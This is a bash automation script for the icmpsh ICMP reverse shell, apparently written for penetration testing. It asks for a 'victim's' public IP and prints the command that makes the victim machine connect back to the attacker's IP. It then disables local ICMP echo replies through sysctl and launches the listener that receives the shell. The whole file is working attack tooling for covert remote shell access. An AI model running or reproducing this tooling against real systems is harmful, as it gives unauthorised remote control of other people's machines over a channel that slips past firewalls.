#!/usr/bin/env bash
# icmp shell script
# Daniel Compton
# 05/2013
echo ""
echo ""
echo -e "\e[00;32m##################################################################\e[00m"
echo ""
echo "ICMP Shell Automation Script for"
echo ""
echo "https://github.com/inquisb/icmpsh"
echo ""
echo -e "\e[00;32m##################################################################\e[00m"

echo ""
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
echo -e "\e[1;31m-------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m What is the victims public IP address?"
echo -e "\e[1;31m-------------------------------------------------------------------\e[00m"
read VICTIM
echo ""
echo -e "\e[01;32m[-]\e[00m Run the following code on your victim system on the listender has started:"
echo ""
echo -e "\e[01;32m++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
echo ""
echo "icmpsh.exe -t "$IP" -d 500 -b 30 -s 128"
echo ""
echo -e "\e[01;32m++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
echo ""
LOCALICMP=$(cat /proc/sys/net/ipv4/icmp_echo_ignore_all)
if [ "$LOCALICMP" -eq 0 ]
                then 
                                echo ""
                                echo -e "\e[01;32m[-]\e[00m Local ICMP Replies are currently enabled, I will disable these temporarily now"
                                sysctl -w net.ipv4.icmp_echo_ignore_all=1 >/dev/null
                                ICMPDIS="disabled"
                else
                                echo ""
fi
echo ""
echo -e "\e[01;32m[-]\e[00m Launching Listener...,waiting for a inbound connection.."
echo ""
python icmpsh_m.py "$IP" "$VICTIM"
if [ "$ICMPDIS" = "disabled" ]
                then
                                echo ""
                                echo -e "\e[01;32m[-]\e[00m Enabling Local ICMP Replies again now"
                                sysctl -w net.ipv4.icmp_echo_ignore_all=0 >/dev/null
                                echo ""
                else
                                echo ""
fi

exit 0

